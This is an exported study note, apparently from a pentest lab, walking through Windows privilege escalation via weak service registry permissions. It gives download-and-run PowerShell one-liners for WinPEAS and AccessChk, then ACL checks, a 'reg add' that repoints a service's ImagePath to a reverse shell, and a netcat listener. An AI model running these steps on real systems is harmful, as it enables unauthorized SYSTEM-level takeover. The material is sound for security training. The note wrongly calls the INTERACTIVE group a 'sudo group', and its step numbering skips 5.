<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Weak Registry Permissions</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Weak Registry Permissions</h1><br /><br /><strong>
      <h3>Weak Registry Permissions</h3>
    </strong><br />• The Windows registry stores entries for each service.<br />• Since registry entries can have ACLs,
    if the ACL is misconfigured, it may be possible to modify a service’s configuration even if we cannot modify the
    service directly.<br /><br />1. Check for service misconfigurations:<br /> ◇ WinPEAS generally check for service
    misconfigurations: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;servicesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div> <br /> <a href=""><img src="images/1324-1.png" alt="images/1324-1.png" /></a><br />2. Confirm the found
    service with:<br /> ◇ Get-Acl <br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;Get-Acl&nbsp;HKLM:\System\CurrentControlSet\Services\regsvc&nbsp;|&nbsp;Format-List</div>
    </div><br /> <a href=""><img src="images/1324-2.png" alt="images/1324-2.png" /></a><br /> ◇ AccessChk(old version
    for command line): <a
      href="https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip" target="_blank">https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip%22,%20%22$env:userprofile/desktop/Accesschk.zip</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uvwqk&nbsp;HKLM\System\CurrentControlSet\Services\regsvc&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1324-3.png" alt="images/1324-3.png" /></a><br /> NT AUTHORITY\INTERACTIVE
    group has full control over the registry entry “regsvc”. This is a sudo group that comprise all the users who can
    login into the system locally.<br />3. Check if we can STOP/START the service<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-ucqv&nbsp;$env:username&nbsp;regsvc&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1324-4.png" alt="images/1324-4.png" /></a><br />4. Check current value of
    the register entry<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;reg&nbsp;query&nbsp;HKLM\SYSTEM\CurrentControlSet\services\regsvc</div>
    </div><br /> <a href=""><img src="images/1324-5.png" alt="images/1324-5.png" /></a><br /> Run with SYSTEM
    privileges!<br />6. Overwrite the ImagePath registry key to point to our reverse shell executable:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;reg&nbsp;add&nbsp;HKLM\SYSTEM\CurrentControlSet\services\regsvc&nbsp;/v&nbsp;ImagePath&nbsp;/t&nbsp;REG_EXPAND_SZ&nbsp;/d&nbsp;C:\PrivEsc\reverse.exe&nbsp;/f
      </div>
    </div><br /> <a href=""><img src="images/1324-6.png" alt="images/1324-6.png" /></a><br />7. Start a listener on
    Kali:<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br /> <br />8. Start the service to trigger the exploit: <br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;net&nbsp;start&nbsp;<span
          style="color:#000000;font-weight:400">&lt;</span>service<span
          style="color:#000000;font-weight:400">&gt;</span></div>
    </div><br /> <br /> <a href=""><img src="images/1324-7.png" alt="images/1324-7.png" /></a><br /> <br /> <br />
    <br />Bibliography: <br />• <a
      href="https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-modify-permissions" target="_blank">https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services-registry-modify-permissions</a><br />
  </div>
</body>

</html>